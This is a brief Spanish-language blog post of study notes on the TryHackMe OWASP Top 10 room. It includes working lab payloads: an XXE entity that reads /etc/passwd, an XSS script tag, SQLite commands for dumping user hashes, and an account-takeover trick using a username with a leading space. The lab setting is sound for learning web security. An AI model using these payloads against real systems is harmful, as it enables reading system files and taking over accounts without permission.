---
title: "owasptop10"
description: "owasptop10"
pubDate: 2025-05-20
---

OWASP Top 10 vulnerabilities web security risks.
https://tryhackme.com/r/room/owasptop10

# 1. Command Injection

Inyección de comandos a la maquina real desde la web

# 2. Broken Authentication

Registrarse con un usuario ya existente poniendo un espacio en el registro " admin" y al iniciar sesión con esta cuenta entramos como admin

# 3. Sensitive Data Exposure

Leak BBDD

````
sqlite3 web.db
````

````
.tables
````

````
SELECT * FROM users;
````

Crack el hash y tienes la contraseña admin de la web

# 4. XML External Entity

Modificar:

````
<!DOCTYPE replace [<!ENTITY name "feast"> ]>  
 <userInfo>  
  <firstName>falcon</firstName>  
  <lastName>&name;</lastName>  
 </userInfo>
````

Leer:

````
`<?xml version="1.0"?>   
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>   
<root>&read;</root>`
````

# 5. Broken Access Control

Pode acceder a recursos que no deberías

# 6. Security Misconfiguration

Default credentials

# 7. Cross-site Scripting

````
<script>document.getElementById("thm-title").innerHTML = "I am a hacker"; </script>
````

# 8. Insecure Deserialization

Insert reverse shell intro cookie, change cookie value

# 9. Components With Known Vulnerabilities

Vulnerabilidades conocidas, uso de scripts

# 10 . Insufficient Logging and Monitoring

Logs de fuerza bruta , etc...
